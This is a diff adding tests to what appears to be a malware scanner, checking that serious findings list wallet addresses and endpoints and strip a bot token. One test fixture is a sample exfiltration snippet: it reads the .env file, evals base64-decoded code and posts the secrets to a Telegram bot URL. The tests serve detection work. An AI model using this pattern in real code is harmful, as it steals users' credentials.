@@ -41,6 +41,26 @@ describe('combinations', () => {
   });
 });
 
+describe('indicators in the evidence of serious findings (for the graph report)', () => {
+  const DEMO = "const wallet = '0x9f00000000000000000000000000000000000001';\nconst env = fs.readFileSync('.env', 'utf8');\nconst b = Buffer.from('Y29u', 'base64').toString();\neval(b);\nfetch('https://api.telegram.org/bot123456:FAKE-TOKEN/sendMessage', { body: env + wallet });";
+  test('a critical finding names the wallet and the endpoint it found, with the bot token removed', () => {
+    const [f] = run([vf('scripts/.cache/setup.js', DEMO)]);
+    expect(f?.severity).toBe('critical');
+    expect(f?.evidence).toContain('wallets: 0x9f00000000000000000000000000000000000001');
+    expect(f?.evidence).toContain('endpoints: https://api.telegram.org/bot123456');
+    expect(f?.evidence).not.toContain('FAKE-TOKEN');
+  });
+  test('a caution finding does not collect indicators', () => {
+    const [f] = run([vf('src/a.js', `eval(x);\nconst a = '0x9f00000000000000000000000000000000000001';`)]);
+    expect(f?.severity).toBe('caution');
+    expect(f?.evidence).not.toContain('wallets');
+  });
+  test('a well-known router in a flagged file is not named', () => {
+    const [f] = run([vf('src/a.js', `eval(x);\nfetch("http://203.0.113.9/p");\nconst r = '0x7a250d5630b4cf539739df2c5dacb4c659f2488d';`)]);
+    expect(f?.evidence).not.toContain('wallets');
+  });
+});
+
 describe('false-positive guards', () => {
   test('child_process in scripts/, build/, tools/, config/ and *.config.* → no finding', () => {
     for (const p of ['scripts/build.js', 'build/x.js', 'tools/gen.ts', 'config/env.js', 'vite.config.ts', 'packages/a/scripts/b.js']) expect(lvl(p, CP), p).toEqual([]);
